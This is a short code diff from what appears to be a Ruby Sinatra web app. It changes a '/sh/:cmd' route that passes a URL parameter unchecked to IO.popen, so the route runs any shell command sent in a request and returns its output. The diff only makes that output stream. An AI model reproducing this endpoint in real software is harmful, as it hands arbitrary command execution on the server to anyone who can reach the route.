@@ -22,7 +22,11 @@ get "/sh/:cmd" do
   logger.info params[:cmd]
 
   content_type :txt
-  IO.popen("#{params[:cmd]} 2>&1")
+
+  io = IO.popen("#{params[:cmd]} 2>&1")
+  io.sync = true
+
+  io
 end
 
 get "/id_rsa.pub" do
